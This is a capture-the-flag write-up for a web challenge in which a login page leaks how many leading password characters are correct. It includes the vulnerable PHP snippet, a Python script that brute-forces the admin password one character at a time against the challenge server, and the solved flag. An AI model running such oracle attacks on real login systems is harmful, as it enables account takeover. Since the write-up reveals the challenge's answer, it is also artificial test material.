# grandmas_notes

## Challenge Summary

- **Category**: Web
- **Points**: 100
- **Solves**: 337 teams

---

### Problem Description

> My grandma is into vibe coding and has developed this web application to help her remember all the important information. It would work be great, if she wouldn't keep forgetting her password, but she's found a solution for that, too.

---

## Challenge Structure

- The admin note, which contains the flag, is only visible after logging in as the admin.
- The application stores passwords in two ways:

  1. Standard password hash (`password_hash()`)
  2. Per-character SHA-256 hashes in the `password_chars` table

- During login, if the full password is incorrect, the application reveals **how many characters at the start of the password were correct**.
- This creates a **login oracle** vulnerability allowing an attacker to brute-force the admin password **character by character**.

---

## Exploitation Flow

### Step 1: Understanding the Oracle

- `login.php` checks the submitted password against the stored hash.
- If `password_verify()` fails, it still iterates over `password_chars` and counts how many leading characters match:

```php
$correct = 0;
for ($i = 0; $i < $limit; $i++) {
    $enteredCharHash = sha256_hex($chars[$i]);
    if (hash_equals($stored[$i]['char_hash'], $enteredCharHash)) {
        $correct++;
    } else {
        break;
    }
}
$_SESSION['flash'] = "Invalid password, but you got {$correct} characters correct!";
```

- This allows **incremental discovery** of the password.

### Step 2: Character-by-Character Brute Force

- Use the oracle to test all possible characters for each position until the correct character increments the "correct characters" count.
- Iterate until the entire password is recovered.

### Step 3: Automated Recovery

- Example Python script using `requests`:

```python
import requests
import string
from urllib.parse import urljoin

BASE_URL = "http://52.59.124.14:5015/"
LOGIN_URL = urljoin(BASE_URL, "login.php")
DASHBOARD_URL = urljoin(BASE_URL, "dashboard.php")
USERNAME = "admin"

CHARSET = string.ascii_letters + string.digits
password = ""

s = requests.Session()
while True:
    for c in CHARSET:
        attempt = password + c
        r = s.post(LOGIN_URL, data={"username": USERNAME, "password": attempt})
        if "you got" in r.text:
            correct = int(r.text.split("you got ")[1].split(" characters")[0])
            if correct > len(password):
                password += c
                break
        elif "dashboard.php" in r.url:
            password += c
            break
    else:
        break

print(f"[+] Recovered password: {password}")
r = s.get(DASHBOARD_URL)
print(re.search("ENO\\{[^\\}]+\\}", r.text).group())
```

---

## Flag

```
ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}
```
